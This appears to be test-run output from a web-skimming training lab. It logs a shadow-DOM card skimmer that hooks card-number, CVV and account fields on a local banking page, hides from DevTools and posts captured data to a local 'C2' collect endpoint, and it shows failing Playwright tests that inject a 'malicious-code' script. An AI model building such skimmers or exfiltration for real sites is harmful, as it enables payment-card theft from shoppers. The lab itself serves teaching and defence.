+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869519518_b36x4 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869519519_no8y5 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869519519_plsk9 
+  ✘  24 [chromium] › test/tests/shadow-skimmer.spec.js:104:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should monitor fields across shadow boundaries (8.1s)
+  ✘  26 [chromium] › test/tests/shadow-skimmer.spec.js:249:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should capture data through shadow isolation (8.1s)
+🏗️ Testing nested shadow DOM structures...
+🔧 Simulating DevTools opening...
+🔧 DevTools detection test: { heightDifference: [33m280[39m, devToolsDetected: [33mtrue[39m }
+🕵️ Stealth measures test: {
+  hasStealthMeasures: [33mtrue[39m,
+  propertyDescriptorModified: [33mtrue[39m,
+  consoleMethodsOverridden: [33mfalse[39m
+}
+✅ Stealth measures detected and active
+👻 Element hiding test: { suspiciousElements: [33m0[39m, hiddenElements: [33m0[39m, totalElements: [33m211[39m }
+🕵️ Anti-detection stealth measures test completed
+  ✓  27 [chromium] › test/tests/shadow-skimmer.spec.js:335:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should implement anti-detection stealth measures (4.3s)
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+🧪 Test Environment: local
+📍 Home Index: http://localhost:3000
+📍 Lab 1 Vulnerable: http://localhost:9001
+📍 Lab 1 C2: http://localhost:9002
+🧪 Test environment: local
+📍 Lab 2 Vulnerable URL: http://localhost:9003
+📍 Lab 2 C2 URL: http://localhost:9004
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522923_jgxuuqbvs 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_0nnx0np0o 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_vn6qo3zmh 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_34sn2ewyy 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869522924_6axlopqzo 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869523026_eqga8 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869523026_6xbsq 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869523026_bekly 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869523027_iw02y 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869523027_i9whj 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869523027_2to0m 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869523027_yk60i 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869523028_dt8pc 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869523028_m3vfk 
+🔍 Analyzing shadow DOM attack patterns...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+📤 Testing shadow attack cleanup on page unload...
+🏗️ Shadow structure analysis: { shadowHostsCount: [33m5[39m, shadowDepths: [ [33m0[39m, [33m0[39m, [33m1[39m, [33m2[39m, [33m3[39m ], maxDepth: [33m3[39m }
+✅ Nested shadow DOM structure confirmed
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM stealth attack...
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525706_iv0o3jfds 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525706_nzkuny6ay 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525706_96fh31mde 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525707_30ii0lv8l 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869525707_zurpad5zx 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869525808_ty38i 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869525809_leftb 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869525809_2jfrj 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869525809_67qrz 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869525809_wgrmz 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869525809_5ofj0 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869525810_gii5c 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869525810_ekwxb 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869525810_3ztmu 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing Shadow DOM skimmer attack... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating nested Shadow DOM structure for enhanced stealth... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526319_tnfnz9bwb 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526320_56yc3j3a5 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526320_p0x2jyir9 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526320_4a9l7cwz0 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Creating Shadow DOM attack infrastructure... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM infrastructure created with ID: shadow_1762869526321_f97hcg3ox 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Created 5 nested Shadow DOM levels 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Setting up cross-shadow boundary monitoring... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Cross-boundary monitoring established 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Starting periodic shadow data exfiltration... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Initializing shadow stealth measures... 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow DOM skimmer attack initialized successfully 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-number_cardNumber_text_1762869526422_b8egk 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-holder-name_cardHolderName_text_1762869526423_wgb2a 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-expiry_cardExpiry_text_1762869526423_ur73i 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv-input_cvv_text_1762869526423_wsfy9 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_card-cvv_cvv_text_1762869526423_u9um1 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: input
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_input_payment-account_accountNumber_text_1762869526423_60ich 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_transfer-form_no-name_no-type_1762869526423_1jplf 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_payment-form_no-name_no-type_1762869526424_1srmw 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Attaching shadow monitoring to element: form
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow monitoring attached to element: shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun 
+📊 Attack pattern analysis: {
+  shadowSkimmerAttack: [33mtrue[39m,
+  hasShadowDOMSupport: [33mtrue[39m,
+  hasTreeWalker: [33mtrue[39m,
+  hasMutationObserver: [33mtrue[39m,
+  hasWeakSet: [33mtrue[39m,
+  hasSendBeacon: [33mtrue[39m,
+  shadowRootsDetected: [33m0[39m,
+  closedShadowRootsLikely: [33m199[39m
+}
+👻 Shadow attack status: {
+  active: [33mtrue[39m,
+  shadowHosts: [33m5[39m,
+  capturedSessions: [33m9[39m,
+  monitoringIntervals: [33m3[39m
+}
+✅ Shadow DOM attack patterns verified
+  ✓  29 [chromium] › test/tests/shadow-skimmer.spec.js:503:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should contain shadow DOM attack patterns (4.7s)
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow event captured: blur for shadow_input_card-number_cardNumber_text_1762869526422_b8egk 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Scheduling immediate shadow exfiltration for: shadow_input_card-number_cardNumber_text_1762869526422_b8egk 
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_form_add-card-form_no-name_no-type_1762869526424_g9kun","elementInfo":{"tagName":"FORM","name":"add-card-form"},"capturedEvents":[{"timestamp":1762869527915,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869527915,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1544}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869527968,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Exfiltrating shadow data for 1 sessions... 
+🌐 REQUEST TO C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  method: [32m'POST'[39m,
+  headers: {
+    [32m'sec-ch-ua-platform'[39m: [32m'"macOS"'[39m,
+    referer: [32m'http://localhost:9003/'[39m,
+    [32m'user-agent'[39m: [32m'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36'[39m,
+    [32m'sec-ch-ua'[39m: [32m'"Not=A?Brand";v="24", "Chromium";v="140"'[39m,
+    [32m'content-type'[39m: [32m'application/json'[39m,
+    [32m'sec-ch-ua-mobile'[39m: [32m'?0'[39m,
+    [32m'accept-language'[39m: [32m'en-US'[39m
+  },
+  postData: [32m'{"type":"shadow_dom_capture","sessions":[{"elementId":"shadow_input_card-number_cardNumber_text_1762869526422_b8egk","elementInfo":{"tagName":"INPUT","type":"text","name":"cardNumber"},"capturedEvents":[{"timestamp":1762869527915,"eventType":"blur","value":""}],"capturedValues":[{"timestamp":1762869527915,"value":"","eventType":"blur"}],"capturedKeystrokes":[],"sessionDuration":1555}],"shadowInfo":{"shadowHostsCount":5,"maxDepth":5,"mode":"closed"},"metadata":{"timestamp":1762869527977,"url":"http://localhost:9003/banking.html","userAgent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36","attackType":"shadow-dom-stealth"}}'[39m
+}
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-foXYsJedjC/djAXW4og+HV7P7QU"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:48 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+📥 RESPONSE FROM C2: {
+  url: [32m'http://localhost:9004/collect'[39m,
+  status: [33m200[39m,
+  headers: {
+    etag: [32m'W/"85-Qu8jjHZbyrshOz/ZC7wccD5NNoA"'[39m,
+    connection: [32m'keep-alive'[39m,
+    [32m'access-control-allow-origin'[39m: [32m'*'[39m,
+    [32m'content-length'[39m: [32m'133'[39m,
+    [32m'keep-alive'[39m: [32m'timeout=5'[39m,
+    date: [32m'Tue, 11 Nov 2025 13:58:48 GMT'[39m,
+    [32m'content-type'[39m: [32m'application/json; charset=utf-8'[39m,
+    [32m'x-powered-by'[39m: [32m'Express'[39m
+  }
+}
+👻 SHADOW-SKIMMER LOG: [Shadow-Skimmer] Shadow data exfiltrated successfully 
+  ✘  28 [chromium] › test/tests/shadow-skimmer.spec.js:442:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle nested shadow DOM structures (8.1s)
+  ✘  30 [chromium] › test/tests/shadow-skimmer.spec.js:568:3 › DOM-Based Skimming Lab - Shadow DOM Stealth Attack › should handle page unload with shadow cleanup (8.1s)
+
+
+  1) [chromium] › test/tests/cc-exfiltration.spec.js:39:3 › Lab 2: DOM-Based Skimming - Credit Card Exfiltration › should enter CC information and verify C2 server shows exfiltrated data 
+
+    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoBeGreaterThan[2m([22m[32mexpected[39m[2m)[22m
+
+    [1mMatcher error[22m: [31mreceived[39m value must be a number or bigint
+
+    Received has value: [31mundefined[39m
+
+      74 |
+      75 |     // Verify attack was recorded
+    > 76 |     expect(stats.totalAttacks).toBeGreaterThan(0)
+         |                                ^
+      77 |     console.log('✅ Attack recorded in C2 server')
+      78 |
+      79 |     // Get recent attacks to verify our data
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/cc-exfiltration.spec.js:76:32
+
+    Error Context: test-results/tests-cc-exfiltration-Lab--62ada-rver-shows-exfiltrated-data-chromium/error-context.md
+
+  2) [chromium] › test/tests/dom-monitor.spec.js:49:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should monitor DOM mutations and attach to new forms 
+
+    ReferenceError: request is not defined
+
+      37 |
+      38 |     page.on('response', response => {
+    > 39 |       if (request.url().includes('/collect')) {
+         |       ^
+      40 |         console.log('📥 RESPONSE FROM C2:', {
+      41 |           url: response.url(),
+      42 |           status: response.status(),
+        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)
+
+    Error: page.waitForLoadState: Test ended.
+
+      52 |     // Load banking page
+      53 |     await page.goto(`${lab2VulnerableUrl}/banking.html`)
+    > 54 |     await page.waitForLoadState('networkidle')
+         |                ^
+      55 |
+      56 |     // Inject DOM monitor attack
+      57 |     await page.addScriptTag({
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:54:16
+
+    Error Context: test-results/tests-dom-monitor-DOM-Base-fadfd-ons-and-attach-to-new-forms-chromium/error-context.md
+
+  3) [chromium] › test/tests/dom-monitor.spec.js:109:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should capture keystrokes in real-time 
+
+    ReferenceError: request is not defined
+
+      37 |
+      38 |     page.on('response', response => {
+    > 39 |       if (request.url().includes('/collect')) {
+         |       ^
+      40 |         console.log('📥 RESPONSE FROM C2:', {
+      41 |           url: response.url(),
+      42 |           status: response.status(),
+        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)
+
+    Error: page.addScriptTag: Test ended.
+
+      113 |
+      114 |     // Inject DOM monitor attack
+    > 115 |     await page.addScriptTag({
+          |     ^
+      116 |       path: './malicious-code/dom-monitor.js'
+      117 |     })
+      118 |
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:115:5
+
+    Error Context: test-results/tests-dom-monitor-DOM-Base-b2c93-ure-keystrokes-in-real-time-chromium/error-context.md
+
+  4) [chromium] › test/tests/dom-monitor.spec.js:174:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should detect and monitor dynamically added forms 
+
+    ReferenceError: request is not defined
+
+      37 |
+      38 |     page.on('response', response => {
+    > 39 |       if (request.url().includes('/collect')) {
+         |       ^
+      40 |         console.log('📥 RESPONSE FROM C2:', {
+      41 |           url: response.url(),
+      42 |           status: response.status(),
+        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)
+
+    Error: page.waitForTimeout: Test ended.
+
+      183 |
+      184 |     // Wait for initial setup
+    > 185 |     await page.waitForTimeout(1000)
+          |                ^
+      186 |
+      187 |     console.log('➕ Adding dynamic form to test mutation observer...')
+      188 |
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:185:16
+
+    Error Context: test-results/tests-dom-monitor-DOM-Base-a3ac1-tor-dynamically-added-forms-chromium/error-context.md
+
+  5) [chromium] › test/tests/dom-monitor.spec.js:240:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should handle high-value field immediate exfiltration 
+
+    ReferenceError: request is not defined
+
+      37 |
+      38 |     page.on('response', response => {
+    > 39 |       if (request.url().includes('/collect')) {
+         |       ^
+      40 |         console.log('📥 RESPONSE FROM C2:', {
+      41 |           url: response.url(),
+      42 |           status: response.status(),
+        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)
+
+    Error: page.addScriptTag: Test ended.
+
+      258 |
+      259 |     // Inject DOM monitor attack
+    > 260 |     await page.addScriptTag({
+          |     ^
+      261 |       path: './malicious-code/dom-monitor.js'
+      262 |     })
+      263 |
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:260:5
+
+    Error Context: test-results/tests-dom-monitor-DOM-Base-f25a9-ield-immediate-exfiltration-chromium/error-context.md
+
+  6) [chromium] › test/tests/dom-monitor.spec.js:318:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should contain DOM monitoring attack patterns 
+
+    ReferenceError: request is not defined
+
+      37 |
+      38 |     page.on('response', response => {
+    > 39 |       if (request.url().includes('/collect')) {
+         |       ^
+      40 |         console.log('📥 RESPONSE FROM C2:', {
+      41 |           url: response.url(),
+      42 |           status: response.status(),
+        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)
+
+    Error: page.addScriptTag: Test ended.
+
+      322 |
+      323 |     // Inject DOM monitor attack and analyze the code
+    > 324 |     await page.addScriptTag({
+          |     ^
+      325 |       path: './malicious-code/dom-monitor.js'
+      326 |     })
+      327 |
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:324:5
+
+    Error Context: test-results/tests-dom-monitor-DOM-Base-cf4aa--monitoring-attack-patterns-chromium/error-context.md
+
+  7) [chromium] › test/tests/dom-monitor.spec.js:368:3 › DOM-Based Skimming Lab - Real-Time Field Monitor › should handle page unload data exfiltration 
+
+    ReferenceError: request is not defined
+
+      37 |
+      38 |     page.on('response', response => {
+    > 39 |       if (request.url().includes('/collect')) {
+         |       ^
+      40 |         console.log('📥 RESPONSE FROM C2:', {
+      41 |           url: response.url(),
+      42 |           status: response.status(),
+        at Page.<anonymous> (/Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:39:7)
+
+    Error: page.addScriptTag: Test ended.
+
+      385 |
+      386 |     // Inject DOM monitor attack
+    > 387 |     await page.addScriptTag({
+          |     ^
+      388 |       path: './malicious-code/dom-monitor.js'
+      389 |     })
+      390 |
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/dom-monitor.spec.js:387:5
+
+    Error Context: test-results/tests-dom-monitor-DOM-Base-e1162-ge-unload-data-exfiltration-chromium/error-context.md
+
+  8) [chromium] › test/tests/form-overlay.spec.js:49:3 › DOM-Based Skimming Lab - Form Overlay Injection › should inject overlay on high-priority forms 
+
+    Error: [2mexpect([22m[31mreceived[39m[2m).[22mtoBe[2m([22m[32mexpected[39m[2m) // Object.is equality[22m
+
+    Expected: [32mtrue[39m
+    Received: [31mfalse[39m
+
+      88 |
+      89 |       console.log('👻 Original form hidden status:', isHidden)
+    > 90 |       expect(isHidden).toBe(true)
+         |                        ^
+      91 |     } else {
+      92 |       console.log('⚠️ Overlay not injected - may need to trigger manually')
+      93 |     }
+        at /Users/kestenbroughton/projectos/e-skimming-labs/labs/02-dom-skimming/test/tests/form-overlay.spec.js:90:24
+
